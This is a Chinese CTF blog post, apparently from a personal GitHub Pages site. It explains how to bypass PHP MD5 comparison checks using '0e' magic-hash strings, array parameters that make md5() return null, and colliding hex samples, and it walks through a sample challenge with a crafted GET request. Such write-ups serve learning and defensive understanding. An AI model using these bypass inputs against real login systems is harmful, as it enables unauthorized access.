@@ -1,0 +1,217 @@
+<html>
+<head>
+    <meta charset="utf-8"/>
+<meta name="description" content=""/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+<title>CTF WEB MD5绕过 | Xing-Fax</title>
+
+<link rel="shortcut icon" href="https://Xing-Fax.GitHub.io/favicon.ico?v=1699016659770">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://Xing-Fax.GitHub.io/styles/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css">
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/languages/dart.min.js"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script>
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <div class="navbar-brand">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            Xing-Fax
+        </div>
+    </div>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+                <div class="nav-item">
+                    
+                        <a href="/" class="menu gt-a-link">
+                            首页
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/archives" class="menu gt-a-link">
+                            归档
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/tags" class="menu gt-a-link">
+                            标签
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/post/about" class="menu gt-a-link">
+                            关于
+                        </a>
+                    
+                </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1699016659770" action="/search/index.html">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    CTF WEB MD5绕过
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2023-07-15 ·
+                    </time>
+                    
+                        <a href="https://Xing-Fax.GitHub.io/tag/php/" class="post-tags">
+                            # PHP
+                        </a>
+                    
+                        <a href="https://Xing-Fax.GitHub.io/tag/web/" class="post-tags">
+                            # WEB
+                        </a>
+                    
+                        <a href="https://Xing-Fax.GitHub.io/tag/ctf/" class="post-tags">
+                            # CTF
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h1 id="md5绕过">MD5绕过</h1>
+ <!-- more --> 
+<p>登录的哈希验证</p>
+<pre><code class="language-php">$a != $b
+md5($a) == md5($b)
+</code></pre>
+<h2 id="0e绕过">0E绕过</h2>
+<p>让两个变量不相等，但md5却相等，可以通过计算0e开头的md5来进行绕过</p>
+<pre><code class="language-php">var_dump(md5(&quot;s878926199a&quot;));
+    //0e545993274517709034328855841020
+var_dump(md5(&quot;s155964671a&quot;));
+	//0e342768416822451524974117254469
+</code></pre>
+<p>因为md5函数返回值为字符串，返回字符串开头都带有0e，并且使用了”==“做判断</p>
+<p>所以字符串会被转化为数值0，0 == 0条件成立</p>
+<h2 id="数组绕过">数组绕过</h2>
+<p>如果并没有使用弱类型&quot;<mark>&quot;来判断，而是采用强类型&quot;</mark>=&quot;来判断，要如何绕过呢</p>
+<pre><code class="language-php">$a != $b
+md5($a) === md5($b)
+</code></pre>
+<p>在md5函数传参中，第一个参数应该是一个字符串，但是如果传入数组则会抛出异常，返回null</p>
+<p>所以null === null条件成立</p>
+<p><strong>GET传入数组方式：</strong></p>
+<pre><code>http://localhost/test.php?a[]=123&amp;a[]=456
+</code></pre>
+<h2 id="碰撞绕过">碰撞绕过</h2>
+<p>如果两个变量强转字符串呢，这个时候就只能使用md5碰撞进行绕过</p>
+<pre><code class="language-php">(string)$a != (string)$b
+md5($a) === md5($b)
+</code></pre>
+<p>两个不同的东西，有相同的md5值</p>
+<p><strong>HEX样本：</strong></p>
+<pre><code>0e306561559aa787d00bc6f70bbdfe3404cf03659e704f8534c00ffb659c4c8740cc942feb2da115a3f4155cbb8607497386656d7d1f34a42059d78f5a8dd1ef
+
+0e306561559aa787d00bc6f70bbdfe3404cf03659e744f8534c00ffb659c4c8740cc942feb2da115a3f415dcbb8607497386656d7d1f34a42059d78f5a8dd1ef
+</code></pre>
+<p>以上两端数据的md5值均为&quot;cee9a457e790cf20d4bdaa6d69f01e41&quot;</p>
+<h2 id="例题">例题</h2>
+<pre><code class="language-php">&lt;?php
+    if(isset($_GET['md5'])){
+        $md5 = $_GET['md5'];
+        if ($md5 == md5($md5)){
+            echo &quot;flag&quot;
+        }
+    }
+?&gt;
+</code></pre>
+<p>由于使用的是弱类型”==“判断，所以我们需要一个”0e“开头的字符串并且md5值也是“0e”开头</p>
+<pre><code>0e00275209979 -&gt; 0e551387587965716321018342879905
+0e00506035745 -&gt; 0e224441551631909369101555335043
+</code></pre>
+<p>GET:</p>
+<pre><code>http://localhost/test.php?md5=0e00275209979
+</code></pre>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://Xing-Fax.GitHub.io/post/type/" class="post-title gt-a-link">
+                    CTF WEB PHP弱类型
+                </a>
+            </div>
+        
+
+        
+
+        
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">温故而知新，可以为师矣~</div>
+    <div class="social-container">
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Website BY <a href="https://github.com/Xing-Fax/" target="_blank">Xing-Fax</a> Powered BY <a
+                href="https://github.com/Xing-Fax/xing-fax.github.io/" target="_blank">GitHub | <a href="https://xing-fax.github.io/atom.xml" target="_blank">RSS</a></a>
+    </div>
+</div>
+
+<script>
+  hljs.initHighlightingOnLoad()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
